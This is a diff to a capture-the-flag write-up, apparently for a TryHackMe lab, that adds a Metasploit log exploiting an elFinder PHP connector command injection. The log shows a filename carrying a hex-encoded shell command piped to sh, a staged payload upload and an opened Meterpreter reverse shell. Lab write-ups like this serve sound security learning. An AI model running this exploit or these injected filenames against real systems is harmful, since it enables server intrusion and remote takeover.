@@ -368,4 +368,35 @@ msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >
 ```
 
 > [!note]
-> Set wrong RHOSTS and should have set LHOST as im t
+> Set wrong RHOSTS and should have set LHOST as im on VM and routed through their VPN:
+
+```
+msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
+RHOSTS => files.lookup.thm
+msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > exploit
+[*] Started reverse TCP handler on 192.168.50.144:4444 
+[*] Uploading payload 'buXDG06.jpg;echo 6370202e2e2f66696c65732f627558444730362e6a70672a6563686f2a202e484d37655230553848542e706870 |xxd -r -p |sh& #.jpg' (1978 bytes)
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.HM7eR0U8HT.php) ...
+[*] No reply
+[*] Removing uploaded file ...
+[+] Deleted uploaded file
+[!] This exploit may require manual cleanup of '.HM7eR0U8HT.php' on the target
+[*] Exploit completed, but no session was created.
+msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST tun0
+LHOST => tun0
+msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > exploit
+[*] Started reverse TCP handler on 192.168.144.173:4444 
+[*] Uploading payload 'Ib21m98.jpg;echo 6370202e2e2f66696c65732f496232316d39382e6a70672a6563686f2a202e684a6e556e4b3839302e706870 |xxd -r -p |sh& #.jpg' (1922 bytes)
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.hJnUnK890.php) ...
+[*] Sending stage (40004 bytes) to 10.66.172.224
+[+] Deleted .hJnUnK890.php
+[*] Meterpreter session 1 opened (192.168.144.173:4444 -> 10.66.172.224:50994) at 2026-02-14 12:12:27 -0500
+[*] No reply
+[*] Removing uploaded file ...                                                                                                                              
+[+] Deleted uploaded file                                                                                                                                   
+                                                                                                                                                            
+meterpreter >         
+```
+
